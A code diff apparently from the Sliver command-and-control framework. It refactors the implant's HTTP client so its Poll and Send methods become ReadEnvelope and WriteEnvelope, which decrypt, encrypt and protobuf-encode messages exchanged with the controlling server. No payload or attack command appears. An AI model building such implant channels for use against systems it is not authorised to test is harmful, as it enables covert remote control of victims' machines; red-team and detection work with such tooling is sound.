@@ -256,8 +256,8 @@ var (
 	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
 )
 
-// Poll - Perform an HTTP GET request
-func (s *SliverHTTPClient) Poll() ([]byte, error) {
+// ReadEnvelope - Perform an HTTP GET request
+func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return nil, errors.New("no session")
 	}
@@ -297,7 +297,16 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 				return nil, err
 			}
 		}
-		return cryptography.GCMDecrypt(*s.SessionKey, data)
+		data, err := cryptography.GCMDecrypt(*s.SessionKey, data)
+		if err != nil {
+			return nil, err
+		}
+		envelope := &pb.Envelope{}
+		err = proto.Unmarshal(data, envelope)
+		if err != nil {
+			return nil, err
+		}
+		return envelope, nil
 	}
 
 	// {{if .Config.Debug}}
@@ -306,8 +315,12 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	return nil, ErrStatusCodeUnexpected
 }
 
-// Send - Perform an HTTP POST request
-func (s *SliverHTTPClient) Send(data []byte) error {
+// WriteEnvelope - Perform an HTTP POST request
+func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
+	data, err := proto.Marshal(envelope)
+	if err != nil {
+		return err
+	}
 	if s.SessionID == "" || s.SessionKey == nil {
 		return errors.New("no session")
 	}
